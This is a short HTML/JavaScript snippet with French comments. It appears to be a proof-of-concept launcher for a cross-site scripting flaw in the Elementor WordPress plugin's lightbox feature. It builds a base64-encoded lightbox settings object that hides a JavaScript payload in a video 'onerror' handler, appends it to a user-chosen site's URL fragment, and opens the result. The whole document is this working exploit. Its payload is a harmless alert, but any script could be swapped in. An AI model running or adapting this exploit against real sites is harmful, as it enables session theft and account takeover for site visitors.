    <script type="text/javascript">
        const jspayload = "alert('xss by trhacknon')";
        const base64 = btoa(JSON.stringify({
            "type": "video",
            "url": "http://",
            "videoType": "hosted",
            "videoParams": {
                "onerror": jspayload,
                "style": "    background-color: white;" +
                    "background-image: url(https://nerdist.com/wp-content/uploads/2020/07/maxresdefault.jpg);" +
                    "background-size: contain;"
            }
        }))

        const payload = '/#elementor-action:action=lightbox&settings=' + base64;

        $(function () {
            $("#website").val(location.hash.substr(1))
        });

        function checkSite() {
            let selectedWebsite = $("#websiteSelector").val(); // Récupérer la valeur de la liste déroulante
            if (!selectedWebsite) {
                selectedWebsite = $("#website").val(); // Si la liste déroulante est vide, récupérer la valeur de l'input text
            }

            if (!/^https?:\/\//i.test(selectedWebsite)) {
                selectedWebsite = 'https://' + selectedWebsite;
            }
            selectedWebsite = selectedWebsite + payload;

            window.open(selectedWebsite, '_blank');
        }
    </script>
